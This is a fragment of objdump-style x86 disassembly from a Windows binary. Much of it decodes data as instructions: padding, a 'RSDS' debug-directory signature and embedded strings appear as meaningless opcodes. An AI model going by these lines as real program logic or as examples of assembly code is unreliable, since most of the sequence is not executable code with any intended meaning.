  420f19:	push   cs
  420f1a:	inc    edx
  420f1b:	add    BYTE PTR [edx-0x71ffbdf2],cl
  420f21:	push   cs
  420f22:	inc    edx
  420f23:	add    BYTE PTR [edx-0x69ffbdf2],dl
  420f29:	push   cs
  420f2a:	inc    edx
  420f2b:	add    BYTE PTR [edx-0x61ffbdf2],bl
  420f31:	push   cs
  420f32:	inc    edx
  420f33:	add    BYTE PTR [edx+0x5800420e],ah
  420f39:	cmovb  eax,DWORD PTR [eax]
  420f3c:	pop    esp
  420f3d:	cmovb  eax,DWORD PTR [eax]
  420f40:	pusha  
  420f41:	cmovb  eax,DWORD PTR [eax]
  420f44:	cmovb  eax,DWORD PTR fs:[eax]
  420f48:	push   0x6c00420f
  420f4d:	cmovb  eax,DWORD PTR [eax]
  420f50:	jo     0x420f61
  420f52:	inc    edx
  420f53:	add    BYTE PTR [edi+ecx*1+0x42],dh
  420f57:	add    al,cl
  420f59:	cmp    edx,DWORD PTR [eax]
  420f5b:	add    BYTE PTR [ecx+0x25],dh
  420f5e:	adc    BYTE PTR [eax],al
  420f60:	fld    TBYTE PTR [ecx]
  420f62:	adc    BYTE PTR [eax],al
  420f64:	xchg   edi,eax
  420f65:	sub    al,0x10
  420f67:	add    dh,ah
  420f69:	aaa    
  420f6a:	adc    BYTE PTR [eax],al
  420f6c:	and    eax,0xd5001051
  420f71:	xor    dl,BYTE PTR [eax]
  420f73:	add    BYTE PTR [eax-0x13ffefd8],ch
  420f79:	push   cs
  420f7a:	inc    edx
  420f7b:	add    al,dh
  420f7d:	push   cs
  420f7e:	inc    edx
  420f7f:	add    ah,dh
  420f81:	push   cs
  420f82:	inc    edx
  420f83:	add    al,bh
  420f85:	push   cs
  420f86:	inc    edx
  420f87:	add    ah,bh
  420f89:	push   cs
  420f8a:	inc    edx
  420f8b:	add    BYTE PTR [eax],al
  420f8d:	cmovb  eax,DWORD PTR [eax]
  420f90:	add    al,0xf
  420f92:	inc    edx
  420f93:	add    BYTE PTR [eax],cl
  420f95:	cmovb  eax,DWORD PTR [eax]
  420f98:	adc    DWORD PTR [ebp+0x10],ebx
  420f9b:	add    bh,cl
  420f9d:	push   es
  420f9e:	adc    BYTE PTR [eax],al
  420fa0:	xchg   esp,eax
  420fa1:	xor    eax,0x7b780010
  420fa6:	adc    BYTE PTR [eax],al
  420fa8:	stos   BYTE PTR es:[edi],al
  420fa9:	jo     0x420fbb
  420fab:	add    BYTE PTR [eax],ch
  420fad:	inc    esp
  420fae:	adc    BYTE PTR [eax],al
  420fb0:	pop    ebp
  420fb1:	pop    ecx
  420fb2:	adc    BYTE PTR [eax],al
  420fb4:	fild   QWORD PTR [edi]
  420fb6:	adc    BYTE PTR [eax],al
	...
  420fc0:	push   edx
  420fc1:	push   ebx
  420fc2:	inc    esp
  420fc3:	push   ebx
  420fc4:	pop    es
  420fc5:	xor    eax,0xcaca54ac
  420fca:	clc    
  420fcb:	inc    ecx
  420fcc:	mov    edi,0x899802eb
  420fd1:	jb     0x420fb5
  420fd3:	mov    ah,0x1
  420fd5:	add    BYTE PTR [eax],al
  420fd7:	add    BYTE PTR [ebx+0x3a],al
  420fda:	pop    esp
  420fdb:	inc    ebx
  420fdc:	jne    0x421050
  420fde:	jb     0x421045
  420fe0:	outs   dx,BYTE PTR ds:[esi]
  420fe1:	je     0x421027
  420fe3:	popa   
  420fe4:	je     0x421047
  420fe6:	pop    esp
  420fe7:	dec    ebp
  420fe8:	outs   dx,DWORD PTR ds:[esi]
  420fe9:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  420ff1:	ins    BYTE PTR es:[edi],dx
  420ff2:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  420ff9:	dec    esi
  420ffa:	gs ja  0x420ffd
  420ffd:	add    BYTE PTR [eax],al
  420fff:	add    BYTE PTR [eax],al
  421001:	add    BYTE PTR [eax],al
  421003:	add    BYTE PTR [edx-0x2c],cl
  421006:	mov    bl,0x4d
  421008:	add    BYTE PTR [eax],al
  42100a:	add    BYTE PTR [eax],al
  42100c:	xor    dl,BYTE PTR [eax]
  42100e:	add    al,BYTE PTR [eax]
  421010:	add    DWORD PTR [eax],eax
  421012:	add    BYTE PTR [eax],al
  421014:	add    DWORD PTR [eax],eax
  421016:	add    BYTE PTR [eax],al
  421018:	add    DWORD PTR [eax],eax
  42101a:	add    BYTE PTR [eax],al
  42101c:	sub    BYTE PTR [eax],dl
  42101e:	add    al,BYTE PTR [eax]
  421020:	sub    al,0x10
  421022:	add    al,BYTE PTR [eax]
  421024:	xor    BYTE PTR [eax],dl
  421026:	add    al,BYTE PTR [eax]
  421028:	mov    edi,0x3e000020
  42102d:	adc    BYTE PTR [edx],al
  42102f:	add    BYTE PTR [eax],al
  421031:	add    BYTE PTR [ebx+0x79],dl
  421034:	ins    DWORD PTR es:[edi],dx
  421035:	bound  ebp,QWORD PTR [edi+0x6c]
  421038:	imul   esp,DWORD PTR [ebx+0x45],0x3f006578
  42103f:	inc    ebx
  421040:	ins    BYTE PTR es:[edi],dx
  421041:	outs   dx,DWORD PTR ds:[esi]
  421042:	jae    0x4210a9
  421044:	push   edi
  421045:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  42104c:	popa   
  42104d:	je     0x4210b8
  42104f:	outs   dx,DWORD PTR ds:[esi]
  421050:	outs   dx,BYTE PTR ds:[esi]
  421051:	inc    ebx
  421052:	ins    BYTE PTR es:[edi],dx
  421053:	outs   dx,DWORD PTR ds:[esi]
  421054:	jae    0x4210bb
  421056:	push   edi
  421057:	.byte 0x69
